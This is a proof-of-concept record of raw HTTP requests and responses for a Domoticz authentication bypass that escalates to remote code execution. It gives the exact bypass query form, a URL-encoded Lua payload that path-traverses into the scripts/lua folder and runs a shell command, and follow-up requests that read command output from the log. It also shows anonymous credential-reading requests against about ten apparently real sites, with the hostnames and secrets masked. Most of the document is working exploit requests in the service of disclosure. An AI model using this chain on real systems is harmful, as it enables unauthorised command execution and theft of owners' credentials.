# Proof of Concept: Original HTTP Record (English Translation)

Public target addresses are replaced with `.invalid` hostnames; request and response structure is preserved.

```text
================================================================================
Domoticz home automation system: authentication bypass leading to remote code execution (RCE)
Original PoC HTTP packets (Burp Suite format)
Record date: 2026-10-20
Affected versions: Domoticz 2026.3 and earlier (fixed in 2026.4)
Vulnerability chain: libwebem checks a raw URI substring for login exemption, but dispatch uses parsed parameters
        -> ?x=?param=logincheck bypasses authentication
        -> param=events&evparam=create writes a dzVents event; ../ in name traverses into scripts/lua
        -> the classic Lua engine executes *_time_*.lua (luaL_openlibs; os/io available)
        -> print is redirected to the server log; getlog returns the command output
Bypass form: /json.htm?x=?param=logincheck&type=command&param=<command>
       The bypass marker must be the first query parameter; keep ? and = literal, without percent encoding.
Observed targets: site-a.invalid (RCE); site-b.invalid:9443 and site-c.invalid:10443 (configuration/credentials)
Safety boundary: Lua runs only echo NCCPROBE, then deletes itself with os.remove; the event is deleted using evparam=delete and checked.
          domoticz.db was not read; devices, users, and configuration were not changed; no destructive command was run.
          All accounts, passwords, keys, hashes, and internal network ranges are masked in the responses.
================================================================================


================================================================================
Case 1: site-a.invalid (HTTP, authentication bypass -> Lua event -> command output)
================================================================================

--- 1.1 Control request (without bypass marker; expected 401) -------------------

GET /json.htm?type=command&param=getsettings HTTP/1.1
Host: site-a.invalid
User-Agent: Mozilla/5.0
Accept: */*
Connection: close


--- 1.1 Response ---------------------------------------------------------------

HTTP/1.1 401
Content-Length: 91

(Built-in Domoticz 401 page, not a reverse proxy.)


--- 1.2 Create event: name traverses into scripts/lua; xml is URL-encoded Lua ---

GET /json.htm?x=?param=logincheck&type=command&param=events&evparam=create&name=../../lua/ncc_time_7a7b1a&interpreter=dzVents&eventtype=All&eventstatus=1&xml=local%20f%3Dio.popen%28%27echo%20NCCPROBE%27%29%3B%20local%20s%3Df%3Aread%28%27%2Aa%27%29%3B%20print%28s%29%3B%20f%3Aclose%28%29%0Alocal%20ok%2Cp%3Dpcall%28function%28%29%20return%20debug.getinfo%281%2C%27S%27%29.source%20end%29%0Aif%20ok%20and%20p%20then%20local%20r%2Ce%3Dos.remove%28p%3Agsub%28%27%5E%40%27%2C%27%27%29%29%3B%20print%28%27NCCPROBE_CLEAN%20%27..tostring%28r%29..%27%20%27..tostring%28e%29%29%20end%0A HTTP/1.1
Host: site-a.invalid
User-Agent: Mozilla/5.0
Accept: */*
Connection: close


--- 1.2 Response ---------------------------------------------------------------

HTTP/1.1 200
Content-Type: application/json
Content-Length: 44

{"status":"OK","title":"AddEvent"}


Decoded Lua (written to scripts/lua/ncc_time_7a7b1a.lua):

local f=io.popen('echo NCCPROBE'); local s=f:read('*a'); print(s); f:close()
local ok,p=pcall(function() return debug.getinfo(1,'S').source end)
if ok and p then local r,e=os.remove(p:gsub('^@','')); print('NCCPROBE_CLEAN '..tostring(r)..' '..tostring(e)) end


--- 1.3 List events to confirm storage and traversal path ----------------------

GET /json.htm?x=?param=logincheck&type=command&param=events&evparam=list HTTP/1.1
Host: site-a.invalid
User-Agent: Mozilla/5.0
Accept: */*
Connection: close


--- 1.3 Response (excerpt; 16 events total) ------------------------------------

HTTP/1.1 200
Content-Type: application/json
Content-Length: 1871

{"status":"OK","title":"events","result":[
 {"id":"23","name":"../../lua/ncc_time_7a7b1a","eventstatus":"1","folderid":"0"}]}


--- 1.4 Read log to obtain command output --------------------------------------

GET /json.htm?x=?param=logincheck&type=command&param=getlog&loglevel=268435455 HTTP/1.1
Host: site-a.invalid
User-Agent: Mozilla/5.0
Accept: */*
Connection: close


--- 1.4 Response (excerpt; observed Content-Length: 44536, 300 log entries) ----

HTTP/1.1 200
Content-Type: application/json

2026-10-20 12:12:00.379  Status: LUA: NCCPROBE
2026-10-20 12:12:00.383  Status: LUA: NCCPROBE_CLEAN true nil

Explanation: the first line is the actual stdout of echo NCCPROBE (read by io.popen and written to the log by print);
             the second shows os.remove(the script itself) returning true, nil, so the Lua file was deleted.


--- 1.5 Delete event -----------------------------------------------------------

GET /json.htm?x=?param=logincheck&type=command&param=events&evparam=delete&event=23&id=23 HTTP/1.1
Host: site-a.invalid
User-Agent: Mozilla/5.0
Accept: */*
Connection: close


--- 1.5 Response ---------------------------------------------------------------

(The server performed the deletion, but reading the response timed out; there is no need to retry deletion.)
Note: in the 2026.3 source, the delete branch reads the parameter named event; id is also supplied for compatibility.
      This request triggers LoadEvents() and rebuilds scripts/dzVents/generated_scripts as part of the normal save process.


--- 1.6 Check deletion ---------------------------------------------------------

GET /json.htm?x=?param=logincheck&type=command&param=events&evparam=list HTTP/1.1
Host: site-a.invalid
User-Agent: Mozilla/5.0
Accept: */*
Connection: close


--- 1.6 Response (two checks agreed) -------------------------------------------

HTTP/1.1 200

{"status":"OK","title":"events","result":[ ... 16 normal events ... ]}

Explanation: ncc_time_7a7b1a had zero matches and the event record was deleted; os.remove had already deleted the script.


================================================================================
Case 2: site-b.invalid:9443 (HTTPS, same bypass anonymously reads SMTP credentials)
================================================================================

--- 2.1 Control request --------------------------------------------------------

GET /json.htm?type=command&param=getsettings HTTP/1.1
Host: site-b.invalid:9443
User-Agent: Mozilla/5.0
Accept: */*
Connection: close


--- 2.1 Response ---------------------------------------------------------------

HTTP/1.1 401
Content-Length: 91


--- 2.2 Bypass request ---------------------------------------------------------

GET /json.htm?x=?param=logincheck&type=command&param=getsettings HTTP/1.1
Host: site-b.invalid:9443
User-Agent: Mozilla/5.0
Accept: */*
Connection: close


--- 2.2 Response (excerpt, masked; observed Content-Length: 3972) --------------

HTTP/1.1 200
Content-Type: application/json

{"status":"OK","title":"settings",
 "EmailUsername":"a2***9t",
 "EmailPassword":"aW***==",
 "EmailServer":"sm***om",
 "EmailPort":"4**",
 "EmailFrom":"kl***om",
 "SecPassword":"d4***7e",
 "ProtectionPassword":"d4***7e",
 "WebLocalNetworks":"12***.*"}


--- 2.3 Read hardware list with the same bypass -------------------------------

GET /json.htm?x=?param=logincheck&type=command&param=gethardware HTTP/1.1
Host: site-b.invalid:9443
User-Agent: Mozilla/5.0
Accept: */*
Connection: close


--- 2.3 Response (excerpt, masked; observed Content-Length: 3668) -------------

HTTP/1.1 200
Content-Type: application/json

{"status":"OK","title":"Hardware","result":[
 {"Name":"M***","Type":"4*","Address":"lo***st","Port":"1***",
  "Extra":";d***ut","Enabled":"t***"}]}


================================================================================
Case 3: site-c.invalid:10443 (HTTPS, anonymous reading of hardware account credentials)
================================================================================

--- 3.1 Control request --------------------------------------------------------

GET /json.htm?type=command&param=getsettings HTTP/1.1
Host: site-c.invalid:10443
User-Agent: Mozilla/5.0
Accept: */*
Connection: close


--- 3.1 Response ---------------------------------------------------------------

HTTP/1.1 401
Content-Length: 91


--- 3.2 Bypass request (gethardware) -------------------------------------------

GET /json.htm?x=?param=logincheck&type=command&param=gethardware HTTP/1.1
Host: site-c.invalid:10443
User-Agent: Mozilla/5.0
Accept: */*
Connection: close


--- 3.2 Response (excerpt, masked; observed Content-Length: 14456) ------------

HTTP/1.1 200
Content-Type: application/json

{"status":"OK","title":"Hardware","result":[
 {"Name":"Ou***ch","Type":"4*","Address":"19***90","Port":"1***",
  "Username":"ma**ot","Password":"j8***Rs","Enabled":"true"},
 {"Name":"Ou***h4","Type":"4*","Address":"19***90","Port":"1***",
  "Username":"ma**ot","Password":"j8***Rs","Enabled":"true"},
 {"Name":"Ou***nd","Type":"4*","Address":"19***90","Port":"1***",
  "Username":"ma**ot","Password":"j8***Rs","Enabled":"true"}]}


--- 3.3 Same-site configuration (getsettings, masked; Content-Length: 3197) ----

GET /json.htm?x=?param=logincheck&type=command&param=getsettings HTTP/1.1
Host: site-c.invalid:10443
User-Agent: Mozilla/5.0
Accept: */*
Connection: close

HTTP/1.1 200

{"status":"OK","title":"settings",
 "SecPassword":"d4***7e","ProtectionPassword":"d4***7e","EmailPort":"2*"}


================================================================================
Other affected targets (seven sites, all classified VULN after full testing)
================================================================================

1) site-e.invalid:7443
   GET /json.htm?x=?param=logincheck&type=command&param=getsettings
   -> 401 (91) / 200 (3922)
      EmailUsername=a2***9t；EmailPassword=a3***==；EmailServer=sm***om；
      EmailPort=5**；EmailFrom=kk***om；SecPassword=d4***7e；
      WebLocalNetworks=12***.*

2) site-f.invalid:4443
   -> 401 (91) / 200 (3318)、gethardware 200 (3937)
      EmailUsername=aG***==；EmailPassword=Y2***Ez；EmailServer=ma***et；
      Hardware record: Username=h***; Password=h***; Address=lo***st

3) site-d.invalid
   -> 401 (91) / 200 (3436)
      EmailUsername=YW***==；EmailPassword=ZG***==；EmailServer=sm***om；
      EmailFrom=an***om；SecPassword=b0***82；ProtectionPassword=82***7b；
      WebLocalNetworks=19***.*

4) site-g.invalid:4443
   -> 401 (91) / 200 (4196)
      ProwlAPI=0f***91；EmailUsername=ZW***J5；EmailPassword=cG***Q=；
      EmailServer=sm***om；SecPassword=f9***42；ProtectionPassword=d4***7e

5) site-h.invalid:9443
   -> 401 (91) / 200 (4153)、gethardware 200 (13157)
      PushbulletAPI=o.***Bm；SecPassword=60***56；ProtectionPassword=60***56；
      Hardware record: Name=Mi***ht; Address=19***10; Port=5***

6) site-i.invalid:9443
   -> 401 (91) / 200 (4104)、gethardware 200 (1217)
      SecPassword=d4***7e；ProtectionPassword=d4***7e；WebLocalNetworks=12***.*
      Hardware record: Username=JU***Fg; Password=35***53 (Type 7*)

7) site-j.invalid:2222
   -> 401 (91) / 200 (3921)、gethardware 200 (7099)
      EmailUsername=ZG***9t；EmailPassword=Rj***ht；EmailServer=ma***om；
      EmailFrom=do***om；WebLocalNetworks=12***.*
      Hardware record: Address=lo***st; Extra=;d***ut


================================================================================
Marker-position comparison (same site; only the marker position changes)
================================================================================

--- A. Marker at end of query string (observed 401; ineffective) -------------

GET /json.htm?type=command&param=getsettings&x=?param=logincheck HTTP/1.1
Host: site-k.invalid:8084
User-Agent: Mozilla/5.0
Connection: close

HTTP/1.1 401


--- B. Marker in first query parameter (observed 200; effective) -------------

GET /json.htm?x=?param=logincheck&type=command&param=getsettings HTTP/1.1
Host: site-k.invalid:8084
User-Agent: Mozilla/5.0
Connection: close

HTTP/1.1 200
Content-Type: application/json

{"status":"OK","title":"settings",...}


================================================================================
Source-code evidence (2026.3)
================================================================================

- main/WebServer.cpp:577-580: getsettings/gethardware/events registered without minRights.
- main/WebServerCmds.cpp: Cmd_GetSettings/Cmd_GetHardware do not check session.rights.
- main/EventSystem.cpp:4326: Cmd_Events has no permission check.
- main/EventSystem.cpp:4477-4577: evparam=create directly performs an INSERT and calls LoadEvents().
- main/EventSystem.cpp:309-316: fopen(dzv_Dir + eitem.Name + ".lua"); Name is not checked for ../.
- main/EventSystem.cpp:1717-1755: scans scripts/lua and executes .lua files with _time_ in the filename.
- main/EventSystem.cpp:2808-2813: EvaluateLuaClassic calls luaL_openlibs; print is redirected to the log.
- 2026.4 fix: match login-exempt commands against parsed parameters, restrict events to administrators, and remove path separators from event names.
================================================================================
```
